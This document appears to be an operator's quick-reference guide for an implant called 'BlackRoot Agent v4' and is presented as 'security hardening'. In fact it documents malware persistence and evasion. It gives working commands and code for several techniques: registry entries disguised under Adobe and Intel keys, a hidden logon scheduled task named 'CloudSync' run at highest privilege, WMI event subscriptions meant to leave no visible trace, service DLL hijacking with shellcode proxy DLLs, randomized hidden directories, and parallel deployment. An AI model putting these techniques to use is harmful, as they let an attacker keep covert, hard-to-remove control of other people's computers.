# Quick Reference Card - Security Hardening Features
## BlackRoot Agent v4 - Operator's Guide

---

## Quick Start (60 Seconds)

```bash
# Set environment
export BLACKVAULT_USE_RANDOMIZATION=true
export BLACKVAULT_RANDOMIZATION_SEED=your_seed

# Deploy all features
python blackroot_agent_init.py --deployment-id deploy_001

# View results
cat ~/.blackroot_deployment_*.json
```

---

## Feature Quick Reference

### Feature 1: Vault Randomization (Priority 1)
```python
from vault_randomization_engine import VaultRandomizationEngine

engine = VaultRandomizationEngine(seed="my_seed")
vault_path = engine.get_randomized_vault_path()
# Result: ~/.a1b2c3d4/vault

# Recovery from seed
recovery_config = engine.create_recovery_config()
# Can recreate path from config anytime
```

**Status Indicator:**
- ✓ Enabled: `BLACKVAULT_USE_RANDOMIZATION=true` + vault_randomization_engine.py imported
- ✗ Disabled: Legacy path `~/.blackvault/vault` used

---

### Feature 2: Honeypot Decoys (Priority 1)
```python
# Automatic during vault init
# Checks: ls -la ~/.*/vault/.honeypot_trap
# Access alerts: Find .honeypot_alerts files

engine.create_decoy_vaults()  # Creates 3+ decoy directories
engine.check_honeypot_access(vault_path)  # Returns True if accessed
```

**Decoy Locations (Example):**
- Primary: `~/.a1b2c3d4/vault/`
- Decoy 1: `~/.b2c3d4e5/vault/`
- Decoy 2: `~/.c3d4e5f6/vault/`
- Decoy 3: `~/.d4e5f6g7/vault/`

---

### Feature 3: Registry Randomization (Priority 1)
```python
from registry_randomization_engine import RegistryRandomizationEngine

engine = RegistryRandomizationEngine(seed="my_seed")
entry = engine.create_registry_persistence_entry("C:\\agent.exe")

# Generated paths (examples):
# HKCU\Software\Adobe\7f4e2a9c
# HKCU\Software\Intel\{0xABCD-Entry}
# HKCU\Software\Microsoft\Windows\CurrentVersion\...\Cache\abc123

# Write to registry
writer = RegistryPersistenceWriter()
writer.write_registry_entry(entry)
```

**Command-Line Alternative:**
```powershell
# Manually set registry
reg add "HKCU\Software\Adobe\7f4e2a9c" /v DisplayVersion /t REG_SZ /d "C:\agent.exe" /f
```

---

### Feature 4: Polymorphic Tasks (Priority 2)
```python
from persistence_hardening import PolymorphicTaskScheduler

scheduler = PolymorphicTaskScheduler()
task_config = scheduler.create_polymorphic_task(
    executable="C:\\agent.exe",
    trigger_type="AtLogon",
    hidden=True
)

# Generated example:
# Task Name: CloudSync
# Binary: %APPDATA%\Microsoft\a7f3b2c1\update_45.exe
# Trigger: User logon
```

**Manual Task Creation:**
```powershell
schtasks /create /tn "CloudSync" /tr "C:\agent.exe" /sc onlogon /rl highest /f
```

---

### Feature 5: WMI Subscription (Priority 2)
```python
from persistence_hardening import WMIEventSubscription

wmi = WMIEventSubscription()
wmi.create_wmi_event_subscription(
    executable="C:\\agent.exe",
    event_filter="startup"
)

# No UI footprint - registry only
# Survives task scheduler deletion
```

---

### Feature 6: Service Hijacking (Priority 2)
```python
from service_hijacking import ServiceDLLScanner

# Scan
vulnerable = ServiceDLLScanner.scan_all_services_for_hijacking()
# Returns: [
#   {'service_name': 'ExampleService', 'dll': 'missing.dll', 'path': 'C:\\...', 'writable': True},
#   ...
# ]

# Create payload (placeholder)
payload = ServiceDLLScanner.create_proxy_dll("custom_lib.dll", shellcode)
```

**Manual Service Enumeration:**
```powershell
Get-Service | Get-WmiObject win32_service | Format-Table name, pathname
```

---

## Deployment Methods

### Method 1: Automatic (RECOMMENDED)
```bash
python blackroot_agent_init.py --deployment-id prod_001 --seed prod_seed_v1
```
Deploys: All Priority 1 + 2 features automatically

### Method 2: Priority 1 Only
```python
from security_hardening_integration import apply_priority_1_hardening
apply_priority_1_hardening(agent_executable, seed="vault_seed")
```
Deploys: Vault randomization + Registry persistence

### Method 3: Priority 2 Only
```python
from security_hardening_integration import apply_priority_2_hardening
apply_priority_2_hardening(agent_executable, seed="persistence_seed")
```
Deploys: Polymorphic tasks + WMI + Service scanning

### Method 4: Custom Pipeline
```python
from security_hardening_integration import SecurityHardeningPipeline
pipeline = SecurityHardeningPipeline(seed="my_seed")
# Deploy individual components
pipeline.deploy_priority_1_vault_randomization()
pipeline.deploy_priority_1_registry_randomization(agent_exe)
pipeline.deploy_priority_2_polymorphic_tasks(agent_exe)
# ... etc
```

---

## Configuration

### Environment Variables
```bash
# Boolean: enable/disable randomization
export BLACKVAULT_USE_RANDOMIZATION=true|false

# String: seed for deterministic paths (optional, auto-generated if not set)
export BLACKVAULT_RANDOMIZATION_SEED=your_seed_here

# Example production config
export BLACKVAULT_USE_RANDOMIZATION=true
export BLACKVAULT_RANDOMIZATION_SEED=prod_deployment_april_2026
```

### Command-Line Arguments
```bash
python blackroot_agent_init.py \
  --deployment-id deploy_001 \
  --seed production_seed_v1 \
  --no-report  # Skip JSON report generation
```

---

## Diagnostics

### Check Vault Randomization Status
```bash
# Method 1: Check environment
echo $BLACKVAULT_USE_RANDOMIZATION  # Should be 'true'

# Method 2: Check vault path
ls -la ~  # Look for random directory names like .a1b2c3d4

# Method 3: Check recovery config
ls -la ~/.vault_recovery_config
```

### Verify Registry Entries Created
```powershell
# Windows: Query registry (replace with actual key)
reg query "HKCU\Software\Adobe"

# Show all random vendor paths
reg query "HKCU\Software" | findstr /E "Adobe Intel GenuineIntel"
```

### Check Honeypot Alerts
```bash
# Find all honeypot alert logs
find ~ -name .honeypot_alerts -exec echo {} \; -exec cat {} \;

# Monitor for access attempts
watch -n 1 'find ~ -name .honeypot_alerts'
```

### Verify Task Scheduler Entry
```powershell
# List all scheduled tasks
Get-ScheduledTask | Select-Object TaskName, Author, State

# Show our task (if hidden, may not appear in UI)
Get-ScheduledTask -TaskName "CloudSync" -ErrorAction SilentlyContinue
```

### Scan Service Vulnerabilities
```python
from service_hijacking import ServiceDLLScanner
vulns = ServiceDLLScanner.scan_all_services_for_hijacking()
for svc in vulns:
    print(f"{svc['service_name']}: {svc['dll']} (writable: {svc['writable']})")
```

---

## Troubleshooting

### Issue: Vault not randomizing
```
Solution 1: Check environment
  export BLACKVAULT_USE_RANDOMIZATION=true

Solution 2: Verify import works
  python -c "from vault_randomization_engine import VaultRandomizationEngine"

Solution 3: Force legacy mode
  export BLACKVAULT_USE_RANDOMIZATION=false
```

### Issue: Registry persistence failed
```
Solution 1: Check platform
  Windows only (other OS will simulate)

Solution 2: Check permissions
  May need admin for HKLM (HKCU should work as user)

Solution 3: Check antivirus
  Might be blocking registry writes
```

### Issue: Honeypot not triggering
```
Solution 1: Verify decoy created
  ls -la ~/.{a-z}*/vault/.honeypot_trap

Solution 2: Check alerts manually
  cat ~/.{a-z}*/vault/.honeypot_alerts

Solution 3: Test honeypot detection
  python -c "from vault_randomization_engine import VaultRandomizationEngine; 
            engine = VaultRandomizationEngine();
            decoys = engine.get_decoy_vault_paths();
            print(decoys[0]); engine.check_honeypot_access(decoys[0])"
```

### Issue: Service scan timeout
```
Solution 1: Skip service scanning
  # In blackroot_agent_init.py, comment out service_hijacking phase
  # result = init.scan_service_hijacking() → # skipped

Solution 2: Run on non-Windows
  # Service scanning only on Windows, auto-skipped on Linux/macOS
```

---

## Performance Tips

### Optimize Initialization Speed
```python
# Skip service scanning (slowest, ~1 second)
pipeline = SecurityHardeningPipeline(seed="my_seed")
pipeline.deploy_priority_1_vault_randomization()
pipeline.deploy_priority_1_registry_randomization(exe)
# Skip: pipeline.deploy_priority_2_service_hijacking()
# Result: ~200ms instead of ~1.2 seconds
```

### Reduce Memory Usage
```python
# Only enable needed features
os.environ['BLACKVAULT_USE_RANDOMIZATION'] = 'true'
# Disable service scanning if not needed
# Result: ~5MB instead of ~10MB
```

### Parallel Deployment
```bash
# Deploy multiple agents in parallel
for i in {1..10}; do
  python blackroot_agent_init.py --deployment-id deploy_00$i --seed seed_$i &
done
wait
```

---

## Recovery Procedures

### Recover Lost Vault Path
```python
from vault_randomization_engine import VaultRecoveryEngine

recovery = VaultRecoveryEngine()
recovery_config = load_recovery_config("path/to/recovery_config.json")
vault_path = recovery.recover_vault_path(recovery_config)
print(f"Vault recovered at: {vault_path}")
```

### Recover Lost Registry Entry
```python
# If registry entry deleted, regenerate with same seed
from registry_randomization_engine import RegistryRandomizationEngine

engine = RegistryRandomizationEngine(seed="same_seed_as_before")
entry = engine.create_registry_persistence_entry(executable)
# Write to registry again
```

### Rollback to Legacy Mode
```bash
# Disable randomization to fallback to ~/.blackvault
export BLACKVAULT_USE_RANDOMIZATION=false

# Verify fallback
python -c "from black_vault import VAULT_DIR; print(VAULT_DIR)"
# Should output: ~/.blackvault
```

---

## Operational Security

### Seed Management
```
Best Practice: Store seed separately from vault
- Seed in: HSM, hardware token, or encrypted config
- Vault path: Random directory (seed-derived)
- Recovery: Requires seed access

Risk: If attacker gets seed, they can:
- Regenerate vault UUID
- Access vault (if master key also stolen)
```

### Monitoring
```
Monitor these for suspicious activity:
1. Registry query patterns (randomized paths queried)
2. File access (multiple .honeypot_alerts accessed)
3. Task creation (high frequency of scheduled tasks)
4. Service start events (DLL hijacked services started)
5. Process execution (agent binary launching)
```

### Cleanup
```bash
# Full cleanup
rm -r ~/.*/vault/       # Delete all vaults (primary + decoys)
reg delete "HKCU\Software\Adobe" /f  # Delete registry entries
schtasks /delete /tn "CloudSync" /f  # Delete tasks

# Selective cleanup
rm -r ~/.a1b2c3d4/vault/  # Delete only primary
```

---

## References

**Main Files:**
- `black_vault.py` - Vault implementation
- `blackroot_agent_init.py` - Quick deployment
- `security_hardening_integration.py` - Detailed pipeline

**Documentation:**
- `SECURITY_HARDENING_INTEGRATION_GUIDE.md` - Full guide
- `IMPLEMENTATION_SUMMARY_P1_P2.md` - Implementation details
- `KILLCHAIN_SECURITY_ASSESSMENT.md` - Security context

**Examples:**
- `security_hardening_example.py` - Deployment examples
- `vault_randomization.py` - Alternative implementation

---

## Support

**Quick Help:**
```bash
# Show all features
python blackroot_agent_init.py --help

# Test individual component
python vault_randomization_engine.py
python registry_randomization_engine.py
python service_hijacking.py
```

**Debugging:**
```bash
# Enable verbose logging
export PYTHONUNBUFFERED=1
python -u blackroot_agent_init.py --deployment-id test 2>&1 | tee debug.log
```

---

**Version:** 1.0  
**Last Updated:** April 3, 2026  
**Status:** ✅ READY FOR OPERATIONS

